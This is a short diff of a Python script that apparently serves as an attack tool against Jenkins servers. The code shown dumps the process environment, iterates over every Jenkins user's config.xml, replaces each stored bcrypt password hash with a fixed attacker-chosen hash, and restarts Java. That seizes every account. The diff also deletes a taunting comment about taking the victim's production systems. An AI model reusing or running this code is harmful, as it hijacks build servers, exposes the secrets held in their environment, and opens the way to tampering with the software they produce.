@@ -25,7 +25,6 @@ BUFFER_SIZE = 1024
 message = "" 
 
 
-##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
 """
 envs = os.environ
@@ -35,7 +34,7 @@ message = pprint.pformat(dict(envs))
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
-                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$1o4OVxu128xqJK4ZSZ9CK.3cjMCs.D/StzWqLzM7FHpfAfRLmlXPS", line )
+                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$zKbMlGACAOZzbPHd/xpv2uk9IvbZAj7bo/M.CR6fu9AuzgZa.uXBG", line )
                 print line,
 message = 'using jenkins: %s ' % str(results)
 print os.system('pkill -HUP java')
